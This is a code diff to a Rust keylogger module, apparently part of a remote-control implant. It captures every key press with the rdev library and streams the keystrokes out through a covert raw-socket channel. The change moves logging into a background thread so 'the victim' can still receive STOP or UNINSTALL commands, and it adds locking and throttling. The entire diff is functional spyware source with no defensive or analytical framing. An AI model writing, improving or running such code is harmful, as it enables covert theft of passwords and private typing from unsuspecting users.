@@ -2,37 +2,44 @@ use rdev::{listen, EventType, Key};
 use crate::covert::CovertChannel;
 use std::thread;
 use std::time::Duration;
+use std::sync::{Arc, Mutex};
 
-pub fn start(mut channel: CovertChannel) {
+pub fn start(channel: Arc<Mutex<CovertChannel>>) {
+    // Spawn the listener in a background thread so the victim can still receive 
+    // other commands (like STOP or UNINSTALL) while the logger runs.
     thread::spawn(move || {
         let mut shift_pressed = false;
+
+        println!("[*] Keylogger background thread started.");
 
         if let Err(error) = listen(move |event| {
             match event.event_type {
                 EventType::KeyPress(key) => {
+                    // Lock the channel only when we have a key to send
+                    let mut chan = channel.lock().unwrap();
+
                     match key {
                         Key::ShiftLeft | Key::ShiftRight => shift_pressed = true,
-                        // rdev uses 'Return' for the Enter key
-                        Key::Return => channel.send_byte(b'\n'),
-                        Key::Space => channel.send_byte(b' '),
-                        Key::Backspace => channel.send_byte(0x08), // ASCII Backspace
-                        Key::Tab => channel.send_byte(b'\t'),
+                        Key::Return => chan.send_byte(b'\n'),
+                        Key::Space => chan.send_byte(b' '),
+                        Key::Backspace => chan.send_byte(0x08), 
+                        Key::Tab => chan.send_byte(b'\t'),
                         
-                        // Handle standard characters
                         _ => {
                             let key_repr = format!("{:?}", key);
-                            // If it's a single character key (like KeyA, KeyB)
+                            // If it's a single character key (like KeyA)
                             if key_repr.starts_with("Key") && key_repr.len() == 4 {
-                                let mut c = key_repr.as_bytes()[3]; // Get the 'A' from "KeyA"
+                                let mut c = key_repr.as_bytes()[3]; 
                                 if !shift_pressed {
                                     c = c.to_ascii_lowercase();
                                 }
-                                channel.send_byte(c);
+                                chan.send_byte(c);
                             } else {
-                                // For things like F1, Esc, etc., wrap in brackets
+                                // For things like F1, Esc, etc.
                                 let meta = format!("[{:?}]", key);
                                 for byte in meta.as_bytes() {
-                                    channel.send_byte(*byte);
+                                    chan.send_byte(*byte);
+                                    // Throttle so the raw socket doesn't drop bytes
                                     thread::sleep(Duration::from_millis(5));
                                 }
                             }
